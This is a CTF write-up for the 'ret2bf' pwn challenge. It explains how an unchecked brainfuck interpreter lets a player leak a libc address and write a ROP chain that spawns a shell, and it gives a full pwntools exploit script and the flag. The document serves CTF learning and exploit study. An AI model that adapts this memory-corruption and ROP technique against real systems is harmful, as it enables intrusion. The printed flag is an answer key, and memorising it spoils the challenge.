https://ctftime.org/event/2512

# ret2bf (pwn)

I heard an interview with Tame Impala where he said, for a song to make an album, it has to have been, at some point, my favorite song ever. Well, there was at least one day when this one was my favorite CTF problem ever. -ProfNinja

nc 0.cloud.chals.io 31782 

## Analysis

We can see the program has essentially all mitigations enabled:

```
[*] '/Users/user/ctf/pwn/ret2bf/pwnme'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

`main` @ `0x1456`
- allocates a buffer on the heap
- reads data from `stdin` with `fgets`
- calls `bf`

`bf` @ `0x1249`
- Implements a brainfuck interpreter
- The program state is stored on the stack
- Does not perform any bounds checking when accessing the program state
    - This allows us to read/write anything on the stack relative to the program state
- I used `b *bf+241` extensively while testing the exploit as this is the location of the write operation

I got the correct version of libc using ret's libc command:

```
$ ret libc ubuntu:22.04
$ sha256sum libc.so.6
5955dead1a55f545cf9cf34a40b2eb65deb84ea503ac467a266d061073315fa7  libc.so.6
```

https://github.com/rerrorctf/ret?tab=readme-ov-file#-libc

## Solution

### Stage 1

Leak a pointer to libc from the stack so we can bypass ASLR and then ret2main.

1) Use `b">" * 120` to set `pc` to a libc return address on the stack
2) Use `b".>" * 8` to read 8 bytes from the stack
3) Use `b"<" * 40` to set `pc` to this function's return address on the stack
4) Use `,` to write the lowest byte to be equal an offset in main
5) Use `-` to decrement the 2nd byte ( e.g from 0x15 to 0x14 ) to preserve the upper nibble's ASLR value but set the lower nibble to match the location in main we want to return to
6) Jump back into main so that we can submit another brainfuck program with knowledge of libc's ASLR base

### Stage 2

Now we know the ASLR base of libc we can perform ret2lib with our control of the stack.

1) Use `b">" * 88` to set `pc` to this function's return address on the stack
2) Use  `b",>" * len(ropchain)` to have the program read our ropchain from stdin and write it to the stack
    - You have some flexibility here, I went with a very reliable `syscall` based approach but there may also be a valid `one_gadget` for something a bit more simple for example
3) Upon exit ret2libc

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./pwnme", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="b bf") # +241
p = remote("0.cloud.chals.io", 31782)

payload = b""
payload += b">" * 120
payload += b".>" * 8
payload += b"<" * 40
payload += b",>-" # use this to return to main
p.sendlineafter(b">", payload)

leak = b""
for i in range(8):
    leak = leak + p.recv(1)
leak = u64(leak)

libc.address = leak - 0x29d90
log.success(f"libc.address {hex(libc.address)}")

p.send(b"\xbc") # last byte of main for ret2main

rop = ROP(libc)
rop.rsi = 0
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.rdx = 0
rop.rax = constants.SYS_execve
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])
ropchain = rop.chain()

payload = b""
payload += b">" * 88
payload += b",>" * len(ropchain)  # use this to return to libc
p.sendlineafter(b">", payload)

p.send(ropchain)

p.interactive() # udctf{I_b3t_th4t_f3lt_s0_g00d}
```

## Flag
`udctf{I_b3t_th4t_f3lt_s0_g00d}`

smiley 2024/11/10
